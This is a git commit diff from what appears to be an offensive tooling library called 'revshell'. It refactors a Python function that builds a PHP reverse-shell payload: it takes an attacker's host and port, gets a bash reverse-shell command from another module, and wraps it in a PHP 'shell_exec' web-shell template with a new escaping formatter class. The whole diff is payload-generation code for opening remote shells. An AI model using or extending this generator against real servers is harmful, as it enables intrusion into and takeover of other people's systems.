20f9bddbeac16f012fadc6455a6a77cd9d4d44cb
crypt0lith <118923461+crypt0lith@users.noreply.github.com>
2025-09-17 13:34:23 -0500

    add: custom PhpAdapter class for PHP-escape formatting

--- revshell/php/cmd/unix.py
+++ revshell/php/cmd/unix.py
@@ -1,6 +1,7 @@
 __all__ = ['reverse_bash']
 
 from json import dumps as to_json
+from string import Formatter
 
 from ...cmd.unix import reverse_bash as bash_cmd
 from ...util import kwdefaults_from
@@ -10,7 +11,16 @@ def _php_escape(__s: str) -> str:
     return to_json(__s, ensure_ascii=False).replace('$', r'\$')
 
 
+class PhpAdapter(Formatter):
+    def format_field(self, value, format_spec):
+        return _php_escape(super().format_field(value, format_spec))
+
+
+_php_adapter = PhpAdapter().format
+
+
 @kwdefaults_from(bash_cmd)
 def reverse_bash(lhost: str, lport: int, **kwargs) -> str:
-    s = _php_escape(bash_cmd(lhost, lport, **kwargs))
-    return f"<pre><?= shell_exec({s}) ?></pre>"
+    return _php_adapter(
+        "<pre><?= shell_exec({}) ?></pre>", bash_cmd(lhost, lport, **kwargs)
+    )
